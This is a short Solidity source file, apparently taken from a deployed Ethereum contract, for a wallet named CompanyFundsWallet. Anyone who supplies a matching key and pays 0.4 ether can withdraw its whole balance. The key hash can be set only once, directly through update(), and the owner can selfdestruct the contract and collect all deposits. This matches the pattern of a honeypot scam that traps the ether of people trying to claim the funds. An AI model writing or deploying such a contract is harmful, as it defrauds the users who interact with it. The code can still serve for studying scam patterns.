/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract CompanyFundsWallet at 0xaee056c6c1071512657f094af550d1af74db0622
*/
pragma solidity ^0.4.24;

contract CompanyFundsWallet
{
    bytes32 keyHash;
    address owner;

    constructor() public {
        owner = msg.sender;
    }

    function withdraw(string key) public payable
    {
        require(msg.sender == tx.origin);
        if(keyHash == keccak256(abi.encodePacked(key))) {
            if(msg.value >= 0.4 ether) {
                msg.sender.transfer(address(this).balance);
            }
        }
    }

    function setup(string key) public
    {
        if (keyHash == 0x0) {
            keyHash = keccak256(abi.encodePacked(key));
        }
    }

    function update(bytes32 _keyHash) public
    {
        if (keyHash == 0x0) {
            keyHash = _keyHash;
        }
    }

    function clear() public
    {
        require(msg.sender == owner);
        selfdestruct(owner);
    }
    
    function () public payable {

    }
}